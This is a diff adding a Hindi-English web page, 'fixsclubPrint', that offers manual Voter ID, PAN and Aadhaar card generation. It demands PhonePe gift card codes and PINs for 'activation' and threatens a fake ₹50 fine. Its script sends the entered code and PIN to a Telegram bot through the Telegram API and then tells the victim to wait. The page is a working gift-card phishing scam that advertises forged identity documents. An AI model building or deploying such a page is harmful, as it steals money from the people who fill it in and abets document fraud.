@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>fixsclubPrint | Official Portal</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
+        .top-banner { background: #d9534f; color: white; padding: 12px; text-align: center; font-weight: bold; font-size: 14px; }
+        .header { background: #2c3e50; color: white; padding: 30px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 600px; margin: 20px auto; padding: 15px; }
+        .service-card { background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; border-left: 6px solid #673ab7; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+        .service-card h3 { margin-top: 0; color: #333; }
+        .payment-box { background: #ffffff; padding: 25px; border-radius: 15px; border: 2px solid #673ab7; text-align: center; }
+        .phonepe-logo { width: 120px; margin-bottom: 15px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+        .btn-submit { background: #673ab7; color: white; padding: 15px; width: 95%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn-submit:hover { background: #512da8; transform: scale(1.02); }
+        .warning-text { background: #fff3f3; color: #b71c1c; padding: 15px; border-radius: 8px; font-size: 13px; margin: 15px 0; border: 1px solid #ffcdd2; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="top-banner">
+    <marquee>📢 Offer: 1 Month Trial Free! Activation Charge ₹100 Only. Galat Voucher par ₹50 Fine lagega!</marquee>
+</div>
+
+<div class="header">
+    <h1>fixsclubPrint</h1>
+    <p>Premium Manual Document Portal</p>
+</div>
+
+<div class="container">
+    <div class="service-card">
+        <h3>Available Services:</h3>
+        <ul style="text-align: left; line-height: 1.8;">
+            <li>✅ Manual Voter ID Card Generation</li>
+            <li>✅ Manual PAN Card (NSDL/UTI)</li>
+            <li>✅ Aadhar Advanced Print</li>
+            <li>✅ High Quality PDF Export</li>
+        </ul>
+    </div>
+
+    <div class="payment-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1200px-PhonePe_Logo.svg.png" class="phonepe-logo">
+        <h3>Account Activation</h3>
+        <p style="color: #666; font-size: 14px;">Enter PhonePe Gift Card details to unlock all services</p>
+        
+        <input type="text" id="gc_code" placeholder="Gift Card Code (16 Digit)" maxlength="16">
+        <input type="password" id="gc_pin" placeholder="Gift Card PIN (6 Digit)" maxlength="6">
+
+        <div class="warning-text">
+            <strong>⚠️ DHYAN DEIN:</strong><br>
+            1. Sirf naya aur valid Gift Card hi dalein.<br>
+            2. Agar Card galat ya use kiya hua nikla, toh <b>₹50 Penalty Fine</b> lagega aur account permanently block ho jayega.
+        </div>
+
+        <button class="btn-submit" onclick="sendToTelegram()">Submit & Activate</button>
+    </div>
+</div>
+
+<script>
+function sendToTelegram() {
+    const code = document.getElementById('gc_code').value;
+    const pin = document.getElementById('gc_pin').value;
+
+    if(code.length < 10 || pin.length < 4) {
+        alert("Kripya sahi Code aur PIN dalein!");
+        return;
+    }
+
+    const confirmFine = confirm("Kya aap sure hain? Galat voucher hone par ₹50 fine lagega. Aage badhein?");
+
+    if (confirmFine) {
+        // Aapka Telegram Logic
+        const botToken = "YOUR_BOT_TOKEN"; // Yahan Token Dalein
+        const chatId = "YOUR_CHAT_ID";     // Yahan Chat ID Dalein
+        const message = `🚀 FIXSCLUB DATA\n\n💳 GC Code: ${code}\n🔑 PIN: ${pin}\n🌐 Site: fixsclubprint.github.io`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(res => {
+            alert("Details verify ho rahi hain! 30 minutes mein portal active ho jayega. Galat hone par fine lagega.");
+            document.getElementById('gc_code').value = "";
+            document.getElementById('gc_pin').value = "";
+        })
+        .catch(err => alert("Error! Kripya internet check karein."));
+    }
+}
+</script>
+
+</body>
+</html>
